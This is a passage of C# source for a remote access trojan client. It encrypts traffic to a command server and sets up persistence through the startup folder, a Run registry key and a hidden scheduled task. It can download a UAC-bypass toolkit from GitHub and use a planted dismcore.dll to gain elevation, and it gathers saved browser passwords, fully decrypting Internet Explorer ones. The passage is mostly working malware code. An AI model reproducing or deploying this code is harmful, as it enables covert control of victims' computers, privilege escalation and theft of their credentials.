                        cipherText = Encoding.Unicode.GetString(ms.ToArray());
                    }
                }
                return cipherText; //Return the plain text data
            }
            catch (Exception ex) //Something went wrong
            {
                Console.WriteLine(ex.Message);
                Console.WriteLine("Cipher Text: " + cipherText);
                ReportError(ErrorType.DECRYPT_DATA_CORRUPTED, "Can't decrypt message!", "Message decryption failed!"); //Report error to the server
                return "error"; //Return error
            }
        }

        /// <summary>
        /// Send data to the server
        /// </summary>
        /// <param name="response">The data to send</param>
        /// <param name="isCmd">If remote cmd is sending the data</param>
        private static void SendCommand(string response)
        {
            if (!_clientSocket.Connected) //If the client isn't connected
            {
                Console.WriteLine("Socket is not connected!");
                return; //Return
            }

            if (IsLinuxServer) response = SSLFormatCommand(response);
            else response = Encrypt(response);
            byte[] data = encoder.GetBytes(response); //Get the bytes of the encrypted data

            try
            {
                if (!IsLinuxServer)
                {
                    _clientSocket.Send(data); //Send the data to the server
                }
                else _sslClient.Write(data);
            }
            catch (Exception ex) //Failed to send data to the server
            {
                Console.WriteLine("Send Command Failure " + ex.Message);
                return; //Return
            }
        }

        /// <summary>
        /// Get the length of byte data in utf8
        /// </summary>
        /// <param name="data">The data to get the length of</param>
        /// <returns>The length of the data in utf8 bytes</returns>
        private static int GetPythonLength(string data)
        {
            int totalLength = 0;

            for (int i = 0; i < data.Length; i++)
            {
                totalLength += Encoding.UTF8.GetByteCount(data[i].ToString());
            }

            return totalLength;
        }

        /// <summary>
        /// Format command for sending through SSL
        /// </summary>
        /// <param name="command">The command to send to the server</param>
        /// <returns></returns>
        private static string SSLFormatCommand(string command)
        {
            // TODO: is this needed? (slash doubling)
            command = command.Replace("\\", "\\\\");
            // Get the length of the command in utf8 bytes
            string cmdLength = GetPythonLength(command).ToString();
            // Splitting pattern
            const string pattern = "!??!%";
            // Return the formatted command
            return $"{cmdLength}{pattern}{command}";
        }

        /// <summary>
        /// Send raw bytes to the server
        /// </summary>
        /// <param name="data">The byte data to send</param>
        private static void SendByte(byte[] data)
        {
            if (!_clientSocket.Connected) //If the client isn't connected
            {
                Console.WriteLine("Socket is not connected!");
                return; //Return
            }

            try
            {
                if (!IsLinuxServer) _clientSocket.Send(data); //Send bytes to the server
                else _sslClient.Write(data);
            }
            catch (Exception ex) //Failed to send data to server
            {
                Console.WriteLine("Send Byte Failure " + ex.Message);
                return; //Return
            }

        }
    }

    /// <summary>
    /// The UAC / Persistence module
    /// </summary>
    public class UAC
    {
        /// <summary>
        /// Create a new shortcut file
        /// </summary>
        /// <param name="targetFile">The shortcut file's path</param>
        /// <param name="linkedFile">The file to point the shortcut to</param>
        private void CreateShortcut(string targetFile, string linkedFile)
        {
            try
            {
                IWshRuntimeLibrary.IWshShell_Class wsh = new IWshRuntimeLibrary.IWshShell_Class(); //Get a new shell
                IWshRuntimeLibrary.IWshShortcut shortcut = (IWshRuntimeLibrary.IWshShortcut)wsh.CreateShortcut(targetFile); //Create the shortcut object
                shortcut.TargetPath = linkedFile; //Set the target path
                shortcut.WorkingDirectory = Application.StartupPath; //Set the working directory important!!
                shortcut.Save(); //Save the object (write to disk)
                                 //Console.WriteLine("Shortcut created");
            }
            catch (Exception ex) //Failed to create shortcut
            {
                Console.WriteLine("Error creating shortcut: " + ex.Message);
            }
        }

#if EnableAutoBypass
        /// <summary>
        /// Auto download the UAC bypass toolkit
        /// </summary>
        /// <returns>The progress of the bypass</returns>
        public IEnumerable<int> AutoLoadBypass()
        {
            //I am not responsible for any damage done! And i am not spreading the malware, using it is optional!
            const string link64 = "https://github.com/AdvancedHacker101/Bypass-Uac/raw/master/Compiled/x64%20bit/"; //Directory to 64 bit version
            const string link86 = "https://github.com/AdvancedHacker101/Bypass-Uac/raw/master/Compiled/x86%20bit/"; //Driectroy to 32 bit verion
            const string unattendFile = "https://raw.githubusercontent.com/AdvancedHacker101/Bypass-Uac/master/unattend.xml"; //The unattend file
            string[] filesToLoad = { "copyFile.exe", "testAnything.exe", "testDll.dll" }; //Remote file names to download
            string[] localName = { "copyFile.exe", "launch.exe", "dismcore.dll" }; //Local file names to save the remote files to
            bool is64 = Is64Bit(); //Get if the system is x64
            string link = ""; //The root link to use
            if (is64) link = link64; //Use the x64 link
            else link = link86; //Use the x86 link
            int index = 0; //Index counter
            WebClient wc = new WebClient(); //Create a new web-client

            foreach (string file in filesToLoad) //go through the remote files
            {
                wc.DownloadFile(link + file, Application.StartupPath + "\\" + localName[index]); //Download the remote file
                index++; //Increment the index
                yield return 25; //Return a 25% increase in the progress
            }

            wc.DownloadFile(unattendFile, Application.StartupPath + "\\unattend.xml"); //Download the unattend file
            yield return 25; //Return a 25% increase in the progress
        }
#endif

        /// <summary>
        /// The methods to use when probing statup
        /// </summary>
        public enum ProbeMethod
        {
            /// <summary>
            /// Use the startup folder
            /// </summary>
            StartUpFolder,
            /// <summary>
            /// Use the registry
            /// </summary>
            Registry,
            /// <summary>
            /// Use the TaskScheduler
            /// </summary>
            TaskScheduler
        }

        /// <summary>
        /// Probe the startup
        /// </summary>
        /// <param name="pm">The mthod to use</param>
        public void ProbeStart(ProbeMethod pm)
        {
            if (pm == ProbeMethod.StartUpFolder) //Probe starup folder
            {
                string suFolder = Environment.GetFolderPath(Environment.SpecialFolder.Startup); //Get the path of the startup folder
                string linkFile = suFolder + "\\" + "client.lnk"; //Be creative if you want to get away with it :)
                if (!File.Exists(linkFile)) CreateShortcut(linkFile, Application.ExecutablePath); //Create the new link file
            }
            else if (pm == ProbeMethod.Registry) //Probe the registry
            {
                if (!IsAdmin()) //Check if client is admin
                {
                    //Report error to the server
                    Program.ReportError(Program.ErrorType.ADMIN_REQUIRED, "Failed to probe registry", "R.A.T is not running as admin! You can try to bypass the uac or use the startup folder method!");
                    return; //Return
                }
                RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\run", true); //Get the usual registry key
                if (key.GetValue("tut_client") != null) key.DeleteValue("tut_client", false); //Check and remove value
                key.SetValue("tut_client", Application.ExecutablePath); //Add the new value
                                                                        //Close and dispose the key
                key.Close();
                key.Dispose();
                key = null;
            }
            else if (pm == ProbeMethod.TaskScheduler) //Probe TaskScheduler
            {
                if (!IsAdmin()) //Check if client is admin
                {
                    //Report error to the server
                    Program.ReportError(Program.ErrorType.ADMIN_REQUIRED, "Failed to probe Task Scheduler", "R.A.T is not running as admin! You can try to bypass the uac or use the startup folder method!");
                    return; //Return
                }
                Process deltask = new Process(); //Delete previous task
                Process addtask = new Process(); //Create the new task
                deltask.StartInfo.FileName = "cmd.exe"; //Execute the cmd
                deltask.StartInfo.Arguments = "/c schtasks /Delete tut_client /F"; //Set tasksch command
                deltask.StartInfo.WindowStyle = ProcessWindowStyle.Hidden; //Hidden process
                deltask.Start(); //Delete the task
                deltask.WaitForExit(); //Wait for it to finish
                                       //Console.WriteLine("Delete Task Completed");
                addtask.StartInfo.FileName = "cmd.exe"; //Execute the cmd
                addtask.StartInfo.Arguments = "/c schtasks /Create /tn tut_client /tr \"" + Application.ExecutablePath + "\" /sc ONLOGON /rl HIGHEST"; //Set tasksch command
                addtask.Start(); //Add the new task
                addtask.WaitForExit(); //Wait for it to finish
                                       //Console.WriteLine("Task created successfully!");
            }
        }

        /// <summary>
        /// Check if client is running elevated
        /// </summary>
        /// <returns>True if client is elevated, otherwise false</returns>
        public bool IsAdmin()
        {
            System.Security.Principal.WindowsIdentity identity = System.Security.Principal.WindowsIdentity.GetCurrent(); //Get my identity
            System.Security.Principal.WindowsPrincipal principal = new System.Security.Principal.WindowsPrincipal(identity); //Get my principal
            return principal.IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator); //Check if i'm an elevated process
        }

        /// <summary>
        /// Check if the system is x64
        /// </summary>
        /// <returns>True if system is x64, otherwise false</returns>
        private bool Is64Bit()
        {
            return Environment.Is64BitOperatingSystem; //Return the x64 state
        }

        /// <summary>
        /// Close the current client
        /// </summary>
        private void CloseInstance()
        {
            Process self = Process.GetCurrentProcess(); //Get my process
            self.Kill(); //Stop the current client
        }

        /// <summary>
        /// Try to bypass the UAC
        /// </summary>
        /// <returns>True if bypass is successful</returns>
        public bool BypassUAC()
        {
            //Declare key file names
            const string dismCoreDll = "dismcore.dll";
            const string copyFile = "copyFile.exe";
            const string unattendFile = "unattend.xml";
            const string launcherFile = "launch.exe";

            //Check core files

            if (!File.Exists(dismCoreDll) || !File.Exists(copyFile) || !File.Exists(unattendFile) || !File.Exists(launcherFile))
            {
                Program.ReportError(Program.ErrorType.FILE_NOT_FOUND, "UAC Bypass", "One or more of the core files not found");
                return false;
            }

            //Copy fake dismcore.dll into System32

            ProcessStartInfo startInfo = new ProcessStartInfo
            {
                FileName = Application.StartupPath + "\\" + copyFile,
                Arguments = "\"" + Application.StartupPath + "\\" + dismCoreDll + "\" C:\\Windows\\System32",
                WindowStyle = ProcessWindowStyle.Hidden
            };
            Process elevatedCopy = new Process
            {
                StartInfo = startInfo
            };
            elevatedCopy.Start();
            Console.WriteLine("Waiting for elevated copy to finish");
            elevatedCopy.WaitForExit();
            if (elevatedCopy.ExitCode != 0) Console.WriteLine("Error during elevated copy");

            //Create a file pointing to the startup path (reference for the fake dll)

            string tempFileLocation = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Temp\\clientlocationx12.txt";

            if (!File.Exists(tempFileLocation)) File.Create(tempFileLocation).Close();
            File.WriteAllText(tempFileLocation, Application.StartupPath);

            //Trigger dismcore.dll with pgkmgr.exe

            startInfo = new ProcessStartInfo
            {
                FileName = Application.StartupPath + "\\" + launcherFile,
                Arguments = "C:\\Windows\\System32\\pkgmgr.exe \"/quiet /n:\"" + Application.StartupPath + "\\" + unattendFile + "\"\"",
                WindowStyle = ProcessWindowStyle.Hidden
            };
            Process bypassProcess = new Process
            {
                StartInfo = startInfo
            };
            bypassProcess.Start();
            Console.WriteLine("Waiting for bypass process to finish");
            bypassProcess.WaitForExit();
            Console.WriteLine("Bypass completed");
            return true;
        }
    }

    /// <summary>
    /// The password recovery module
    /// </summary>
    public class PasswordManager
    {
        /// <summary>
        /// Find a window
        /// </summary>
        /// <param name="lpClassName">The class name of the window</param>
        /// <param name="lpWindowName">The title of the window</param>
        /// <returns>The handle of the window</returns>
        [DllImport("user32.dll", SetLastError = true)]
        static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
        /// <summary>
        /// Find a child window
        /// </summary>
        /// <param name="hwndParent">The handle of the parent window</param>
        /// <param name="hwndChildAfter">The handle of the child window to return the child window after</param>
        /// <param name="lpszClass">The class of the window</param>
        /// <param name="lpszWindow">The title of the window</param>
        /// <returns>The handle of the child window</returns>
        [DllImport("user32.dll", SetLastError = true)]
        static extern IntPtr FindWindowEx(IntPtr hwndParent, IntPtr hwndChildAfter, string lpszClass, string lpszWindow);
        /// <summary>
        /// Send message to a window
        /// </summary>
        /// <param name="hWnd">Handle of the target window</param>
        /// <param name="Msg">The code of the message to send to <see cref="hWnd"/></param>
        /// <param name="wParam">WParameter of the command</param>
        /// <param name="lParam">LParameter of the command</param>
        /// <returns>The result of the command</returns>
        [DllImport("user32.dll", CharSet = CharSet.Ansi)]
        private static extern IntPtr SendMessageA(IntPtr hWnd, int Msg, IntPtr wParam, IntPtr lParam);
        /// <summary>
        /// Open a process
        /// </summary>
        /// <param name="processAccess">The access to open the process with</param>
        /// <param name="bInheritHandle">True if you want to inherit the handle</param>
        /// <param name="processId">The ID of the process to open</param>
        /// <returns>The handle of the opened process</returns>
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(ProcessAccessFlags processAccess, bool bInheritHandle, int processId);
        /// <summary>
        /// Allocate memory
        /// </summary>
        /// <param name="hProcess">The handle of the process to allocate memory in</param>
        /// <param name="lpAddress">The address of the memory to allocate</param>
        /// <param name="dwSize">The size of the memory to allocate</param>
        /// <param name="flAllocationType">Memory allocation type</param>
        /// <param name="flProtect">Memory protection</param>
        /// <returns>A pointer to the allocated space</returns>
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, IntPtr dwSize, AllocationType flAllocationType, MemoryProtection flProtect);
        /// <summary>
        /// Write to memory
        /// </summary>
        /// <param name="hProcess">The process to write the memory of</param>
        /// <param name="lpBaseAddress">The address of the memory to write</param>
        /// <param name="lpBuffer">The buffer to write to the memory</param>
        /// <param name="nSize">The size of the <see cref="lpBuffer"/></param>
        /// <param name="lpNumberOfBytesWritten">A pointer to the number of written bytes</param>
        /// <returns>The result of the write</returns>
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, IntPtr lpBuffer, UInt32 nSize, UIntPtr lpNumberOfBytesWritten);
        /// <summary>
        /// Read the memory
        /// </summary>
        /// <param name="hProcess">The process to read the memory of</param>
        /// <param name="lpBaseAddress">The address of the memory to read</param>
        /// <param name="lpBuffer">The buffer to read the data to</param>
        /// <param name="dwSize">The size of the data to read</param>
        /// <param name="lpNumberOfBytesRead">Pointer to the number of written bytes</param>
        /// <returns>The result of the action</returns>
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);
        /// <summary>
        /// Free an allocated memory space
        /// </summary>
        /// <param name="hProcess">The process to free memory of</param>
        /// <param name="lpAddress">The address of the memory to free</param>
        /// <param name="dwSize">The size of the memory to free</param>
        /// <param name="dwFreeType">The type of the free operation</param>
        /// <returns>The result of the free</returns>
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern bool VirtualFreeEx(IntPtr hProcess, IntPtr lpAddress, int dwSize, FreeType dwFreeType);
        /// <summary>
        /// Close a process handle
        /// </summary>
        /// <param name="hObject">The handle of the process</param>
        /// <returns>The result of the close</returns>
        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool CloseHandle(IntPtr hObject);

        /// <summary>
        /// Window code to the base of ListView control calls
        /// </summary>
        private const int LVM_FIRST = 0x1000;
        /// <summary>
        /// Window code to getting the number of items in a <see cref="ListView"/> control
        /// </summary>
        private const int LVM_GETITEMCOUNT = LVM_FIRST + 4;
        /// <summary>
        /// Window code to getting an item from a <see cref="ListView"/> control
        /// </summary>
        private const int LVM_GETITEM = LVM_FIRST + 115;
        /// <summary>
        /// <see cref="ListViewItem"/> get text mask value
        /// </summary>
        private const int LVIF_TEXT = 0x0001;
        private const int ffprColumn = 13;
        private const int gcprColumn = 7;
        private const int ieprColumn = 1;
        private const int ffprLvid = 0;
        private const int gcprLvid = 0;
        private const int ieprLvid = 0;

        /// <summary>
        /// Memory protection actions
        /// </summary>
        public enum MemoryProtection
        {
            /// <summary>
            /// Execute Only
            /// </summary>
            Execute = 0x10,
            /// <summary>
            /// Execute and Read
            /// </summary>
            ExecuteRead = 0x20,
            /// <summary>
            /// Execute, Read and Write
            /// </summary>
            ExecuteReadWrite = 0x40,
            /// <summary>
            /// Execute, Write and Copy
            /// </summary>
            ExecuteWriteCopy = 0x80,
            /// <summary>
            /// No access to memory
            /// </summary>
            NoAccess = 0x01,
            /// <summary>
            /// Read Only
            /// </summary>
            ReadOnly = 0x02,
            /// <summary>
            /// Read and Write
            /// </summary>
            ReadWrite = 0x04,
            /// <summary>
            /// Write and Copy
            /// </summary>
            WriteCopy = 0x08,
            /// <summary>
            /// Modify the guard
            /// </summary>
            GuardModifierflag = 0x100,
            /// <summary>
            /// Modify the caching
            /// </summary>
            NoCacheModifierflag = 0x200,
            /// <summary>
            /// Modify the combined writing
            /// </summary>
            WriteCombineModifierflag = 0x400
        }

        /// <summary>
        /// Memory allocation types
        /// </summary>
        public enum AllocationType
        {
            /// <summary>
            /// Commit memory
            /// </summary>
            Commit = 0x1000,
            /// <summary>
            /// Reserver the space
            /// </summary>
            Reserve = 0x2000,
            /// <summary>
            /// Decommit memory
            /// </summary>
            Decommit = 0x4000,
            /// <summary>
            /// Release the space
            /// </summary>
            Release = 0x8000,
            /// <summary>
            /// Reset memory space
            /// </summary>
            Reset = 0x80000,
            /// <summary>
            /// Physical allocation
            /// </summary>
            Physical = 0x400000,
            /// <summary>
            /// Top Down allocation
            /// </summary>
            TopDown = 0x100000,
            /// <summary>
            /// Write Watch Allocation
            /// </summary>
            WriteWatch = 0x200000,
            /// <summary>
            /// Large Pages allocation
            /// </summary>
            LargePages = 0x20000000
        }

        /// <summary>
        /// c++ <see cref="ListViewItem"/>struct
        /// </summary>
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        private struct LVITEM
        {
            /// <summary>
            /// Mask of the item
            /// </summary>
            public uint mask;
            /// <summary>
            /// Index of the item
            /// </summary>
            public int iItem;
            /// <summary>
            /// Index of the subitem
            /// </summary>
            public int iSubItem;
            /// <summary>
            /// The state of the item
            /// </summary>
            public uint state;
            /// <summary>
            /// The state mask of the item
            /// </summary>
            public uint stateMask;
            /// <summary>
            /// Pointer to the text of the item
            /// </summary>
            public IntPtr pszText;
            /// <summary>
            /// The size of the text of the item
            /// </summary>
            public int cchTextMax;
            /// <summary>
            /// The image code of the item
            /// </summary>
            public int iImage;
            /// <summary>
            /// The LParam of the item
            /// </summary>
            public IntPtr lParam;
        }

        /// <summary>
        /// Process Desired Access Codes
        /// </summary>
        public enum ProcessAccessFlags : uint
        {
            /// <summary>
            /// Request all access
            /// </summary>
            All = 0x001F0FFF,
            /// <summary>
            /// Only terminate process
            /// </summary>
            Terminate = 0x00000001,
            /// <summary>
            /// Create a thread in the process
            /// </summary>
            CreateThread = 0x00000002,
            /// <summary>
            /// Do Memory Operations on the process
            /// </summary>
            VirtualMemoryOperation = 0x00000008,
            /// <summary>
            /// Only read memory of the process
            /// </summary>
            VirtualMemoryRead = 0x00000010,
            /// <summary>
            /// Only write memory of the process
            /// </summary>
            VirtualMemoryWrite = 0x00000020,
            /// <summary>
            /// Duplicate the handle of the process
            /// </summary>
            DuplicateHandle = 0x00000040,
            /// <summary>
            /// Create a child process
            /// </summary>
            CreateProcess = 0x000000080,
            /// <summary>
            /// Set process quota
            /// </summary>
            SetQuota = 0x00000100,
            /// <summary>
            /// Set process information
            /// </summary>
            SetInformation = 0x00000200,
            /// <summary>
            /// Query process information
            /// </summary>
            QueryInformation = 0x00000400,
            /// <summary>
            /// Query limited process infromation
            /// </summary>
            QueryLimitedInformation = 0x00001000,
            /// <summary>
            /// Synchronize the process
            /// </summary>
            Synchronize = 0x00100000
        }

        /// <summary>
        /// Free memory allocation options
        /// </summary>
        public enum FreeType
        {
            /// <summary>
            /// Recommit memory
            /// </summary>
            Decommit = 0x4000,
            /// <summary>
            /// Release memory
            /// </summary>
            Release = 0x8000,
        }

        /// <summary>
        /// Try to get every saved password in the 3 major browsers
        /// </summary>
        /// <returns>An array of browser passwords</returns>
        public string[] GetSavedPassword()
        {
            List<string> result = new List<string>(); //The recovery result
            string[] gcpw = GetGCpw(); //Google Chrome Passwords
            string[] iepw = GetIEpw(); //Internet Explorer Passwords
            string[] ffpw = GetFFpw(); //Firefox Passwords
            StringBuilder subResult = new StringBuilder();
            //Format and Parse password data
            for (int i = 0; i < gcpw.Length; i++)
            {
                string entry = gcpw[i];
                if (i + 1 != gcpw.Length)
                {
                    subResult.Append(entry).Append("\n");
                }
                else
                {
                    subResult.Append(entry);
                }
            }

            result.Add(subResult.ToString());
            subResult.Clear();

            for (int i = 0; i < iepw.Length; i++)
            {
                string entry = iepw[i];
                if (i + 1 != iepw.Length)
                {
                    subResult.Append(entry).Append("\n");
                }
                else
                {
                    subResult.Append(entry);
                }
            }

            result.Add(subResult.ToString());
            subResult.Clear();

            for (int i = 0; i < ffpw.Length; i++)
            {
                string entry = ffpw[i];
                if (i + 1 != ffpw.Length)
                {
                    subResult.Append(entry).Append("\n");
                }
                else
                {
                    subResult.Append(entry);
                }
            }

            result.Add(subResult.ToString());
            subResult.Clear();
            subResult = null;

            return result.ToArray(); //Return the passwords
        }

        /// <summary>
        /// Recover Internet Explorer Passwords
        /// </summary>
        /// <returns>An array of recovered passwords</returns>
        public string[] GetIEpw()
        {
            List<string[]> data = new List<string[]>(); //Return value from decryptor
            List<string> pwresult = new List<string>(); //Recovered password data
            UrlHistoryWrapperClass urlHistory; //URL History Object
            UrlHistoryWrapperClass.STATURLEnumerator enumerator; //URL Enumerator Object
            System.Collections.ArrayList list = new System.Collections.ArrayList(); //URL List
            urlHistory = new UrlHistoryWrapperClass(); //Create new history object
            enumerator = urlHistory.GetEnumerator(); //Get the URL enumerator
            enumerator.GetUrlHistory(list); //Get the History list
            foreach (STATURL entry in list) //Loop thorugh the history
            {
                //Console.WriteLine(append);
                bool result = DecryptIEpassword(entry.URL, data); //Try to decrypt the passwords
                if (!result) data.Clear(); //Failed to decrypt -> empty result
                if (data.Count == 0)
                {
                    continue;
                }
                else
                {
                    StringBuilder append = new StringBuilder();
                    // Build the login credentials data
                    append.Append(data[0][0]).Append("§")
                        .Append(data[0][1]).Append("§")
                        .Append(data[0][2]);
                    pwresult.Add(append.ToString()); //Append to recovered list
                }
            }

            if (pwresult.Count == 0) //No recovered passwords
            {
                pwresult.Add("failed"); //Recovery Failed
            }

            return pwresult.ToArray(); //Return the recovered passwords
        }

        public const string keystr = "Software\\Microsoft\\Internet Explorer\\IntelliForms\\Storage2"; //Registry key to stored passwords

        /// <summary>
        /// Try to decrypt passwords using the given url
        /// </summary>
        /// <param name="url">The URL to decrypt passwords with</param>
        /// <param name="dataList">The result object to set</param>
        /// <returns>True if decrypted password, otherwise false</returns>
        public bool DecryptIEpassword(string url, List<String[]> dataList)
        {
            string urlhash = GetURLHashString(url); //Get the hash of the URL
            if (!DoesURLMatchWithHash(urlhash)) return false; //Check if Hash exists
                                                              //MessageBox.Show("url match " + url);
            RegistryKey key = Registry.CurrentUser.OpenSubKey(keystr); //Open the registry passwords location
            if (key == null) return false; //Return if failed to open the key
            byte[] cypherBytes = (byte[])key.GetValue(urlhash); //Get the encrypted bytes of the URL
            key.Close(); //Close the registry key
            byte[] optionalEntropy = new byte[2 * (url.Length + 1)]; //Decryption key
            Buffer.BlockCopy(url.ToCharArray(), 0, optionalEntropy, 0, url.Length * 2); //Copy data to the decryption key
            byte[] decryptedBytes = ProtectedData.Unprotect(cypherBytes, optionalEntropy, DataProtectionScope.CurrentUser); //Decrypt the secret data
            var ieAutoHeader = ByteArrayToStructure<IEAutoCompleteSecretHeader>(decryptedBytes); //Convert to IE Auto Complete Object
            if (decryptedBytes.Length >= (ieAutoHeader.dwSize + ieAutoHeader.dwSecretInfoSize + ieAutoHeader.dwSecretSize)) //Check the size of the decrypted data
            {
                uint dwTotalSecrets = ieAutoHeader.IESecretHeader.dwTotalSecrets / 2; //Get the secret data size
                int sizeOfSecretEntry = Marshal.SizeOf(typeof(SecretEntry)); //Get the size of the secret object
                byte[] secretsBuffer = new byte[ieAutoHeader.dwSecretSize]; //Create buffer for secret data
                int offset = (int)(ieAutoHeader.dwSize + ieAutoHeader.dwSecretInfoSize); //Secret data offset
                Buffer.BlockCopy(decryptedBytes, offset, secretsBuffer, 0, secretsBuffer.Length); //Copy data to the secrets buffer
                                                                                                  //Purge the result list
                if (dataList == null)
                {
                    dataList = new List<string[]>();
                }
                else
                {
                    dataList.Clear();
                }
                offset = Marshal.SizeOf(ieAutoHeader); //Get the size of the auto complete header
                for (int i = 0; i < dwTotalSecrets; i++) //Go through the secrets
                {
                    byte[] secEntryBuffer = new byte[sizeOfSecretEntry]; //Create buffer for secret data
                    Buffer.BlockCopy(decryptedBytes, offset, secEntryBuffer, 0, secEntryBuffer.Length); //Copy the secret data from the main buffer
                    SecretEntry secEntry = ByteArrayToStructure<SecretEntry>(secEntryBuffer); //Convert to Secret Entry
                    String[] dataTriplets = new String[3]; //For storing the results
                    byte[] secret1 = new byte[secEntry.dwLength * 2]; //Get the first secret data
                    Buffer.BlockCopy(secretsBuffer, (int)secEntry.dwOffset, secret1, 0, secret1.Length); //Copy the first secret from the secrets buffer
                    dataTriplets[0] = Encoding.Unicode.GetString(secret1); //Set the result Username
                    offset += sizeOfSecretEntry; //Add this entry to the offset
                    Buffer.BlockCopy(decryptedBytes, offset, secEntryBuffer, 0, secEntryBuffer.Length); //Get the next secret
                    secEntry = ByteArrayToStructure<SecretEntry>(secEntryBuffer); //Convert the secret to the SecretEntry type
                    byte[] secret2 = new byte[secEntry.dwLength * 2]; //Create buffer for second secret
                    Buffer.BlockCopy(secretsBuffer, (int)secEntry.dwOffset, secret2, 0, secret2.Length); //Copy the second secret to the buffer
                    dataTriplets[1] = Encoding.Unicode.GetString(secret2); //Set the result password
                    dataTriplets[2] = url; //Set the result url
                    dataList.Add(dataTriplets); //Add the password to the result list
                    offset += sizeOfSecretEntry; //Increment the offset
                }
            }

            return true; //Success, decrypted
        }

        /// <summary>
        /// Get the hash string of an URL
        /// </summary>
        /// <param name="wstrUrl">The url to hash</param>
        /// <returns>The hash of the given url</returns>
        public String GetURLHashString(string wstrUrl)
        {
            IntPtr hProv = IntPtr.Zero; //Crypto Provider
            IntPtr hHash = IntPtr.Zero; //The resulting hashing function

            CryptAcquireContext(out hProv, String.Empty, String.Empty, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT); //Get a new RSA crypto context
            if (!CryptCreateHash(hProv, ALG_ID.CALG_SHA1, IntPtr.Zero, 0, ref hHash)) //Get SHA1 hasher
                throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error());
            byte[] bytesToCrypt = Encoding.Unicode.GetBytes(wstrUrl); //Get the bytes of the URL
            StringBuilder urlhash = new StringBuilder(42); //The hash of the URL
            if (CryptHashData(hHash, bytesToCrypt, (uint)(wstrUrl.Length + 1) * 2, 0)) //Hash the URL bytes
            {
                uint dwHashLen = 20; //The length of the hashed value
                byte[] buffer = new byte[dwHashLen]; //Create a new buffer for the hash
                if (!CryptGetHashParam(hHash, HashParameters.HP_HASHVAL, buffer, ref dwHashLen, 0)) //Get the hash value
                    throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error());
                byte tail = 0;
                urlhash.Length = 0;
                //Append the bytes to the final Hash
                for (int i = 0; i < dwHashLen; i++)
                {
                    byte c = buffer[i];
                    tail += c;
                    urlhash.AppendFormat("{0:X2}", c);
                }
                urlhash.AppendFormat("{0:X2}", tail); //Append the last byte at the end
                CryptDestroyHash(hHash); //Destroy the Hashing function
            }
            CryptReleaseContext(hProv, 0); //Release the crypto context
            return urlhash.ToString(); //Return the url Hash
        }

        /// <summary>
        /// Checks if the password container has this URL stored
        /// </summary>
        /// <param name="urlHash">The hash of the URL</param>
        /// <returns>True if password is stored for this URL</returns>
        public bool DoesURLMatchWithHash(string urlHash)
        {
            bool result = false; //Result variable
            RegistryKey key = Registry.CurrentUser.OpenSubKey(keystr); //Open the password storage
            if (key == null) return false; //Return false if can't open key
            string[] values = key.GetValueNames(); //Get every registry key's name
            foreach (string name in values) //Loop through the keys
            {
                if (name == urlHash) //If key name matches the hashed url
                {
                    result = true; //Return true
                    break; //Break out
                }
            }

            return result; //Return the result
        }

        /// <summary>
        /// Convert byte array to a structure
        /// </summary>
        /// <typeparam name="T">The type of the struct</typeparam>
        /// <param name="bytes">The bytes to convert</param>
        /// <returns>The converted struct</returns>
        public T ByteArrayToStructure<T>(byte[] bytes) where T : struct
        {
            GCHandle handle = GCHandle.Alloc(bytes, GCHandleType.Pinned); //Pin the bytes in GC
            T stuff = (T)Marshal.PtrToStructure(handle.AddrOfPinnedObject(), typeof(T)); //Convert the bytes to the structure
            handle.Free(); //Remove the GC Pinning
            return stuff; //Return the converted struct
        }

        /// <summary>
        /// Internet Explorer Secret Data Struct
        /// </summary>
        [StructLayout(LayoutKind.Sequential)]
        struct IESecretInfoHeader
        {
            public uint dwidheader;
            public uint dwSize;
            public uint dwTotalSecrets;
            public uint unknow;
            public uint id4;
            public uint unknownZero;
        };

        /// <summary>
        /// Internet Explorer Auto Complete Header Struct
        /// </summary>
        [StructLayout(LayoutKind.Sequential)]
        struct IEAutoCompleteSecretHeader
        {
            public uint dwSize;
            public uint dwSecretInfoSize;
            public uint dwSecretSize;
            public IESecretInfoHeader IESecretHeader;
        };

        /// <summary>
        /// Internet Explorer Secret Entry
        /// </summary>
        [StructLayout(LayoutKind.Explicit)]
        struct SecretEntry
        {
            [FieldOffset(0)]
            public uint dwOffset;

            [FieldOffset(4)]
            public byte secretId;
            [FieldOffset(5)]
            public byte secretId1;
            [FieldOffset(6)]
            public byte secretId2;
            [FieldOffset(7)]
            public byte secretId3;
            [FieldOffset(8)]
            public byte secretId4;
            [FieldOffset(9)]
            public byte secretId5;
            [FieldOffset(10)]
            public byte secretId6;
            [FieldOffset(11)]
            public byte secretId7;

            [FieldOffset(12)]
            public uint dwLength;
        };

        /// <summary>
        /// RSA Provider ID
        /// </summary>
        private const uint PROV_RSA_FULL = 1;
        /// <summary>
        /// Verify context ID
        /// </summary>
        private const uint CRYPT_VERIFYCONTEXT = 0xF0000000;
        /// <summary>
        /// ALG HASH Base ID
        /// </summary>
        private const int ALG_CLASS_HASH = 4 << 13;
        /// <summary>
        /// SHA1 hashing ID
        /// </summary>
        private const int ALG_SID_SHA1 = 4;

        /// <summary>
        /// Hashing Algorithms
        /// </summary>
        public enum ALG_ID
        {
            /// <summary>
            /// MD5 Algorithm
            /// </summary>
            CALG_MD5 = 0x00008003,
            /// <summary>
            /// SHA1 Algorithm
            /// </summary>
            CALG_SHA1 = ALG_CLASS_HASH | ALG_SID_SHA1
        }

        /// <summary>
        /// Hash Parameters
        /// </summary>
        enum HashParameters
        {
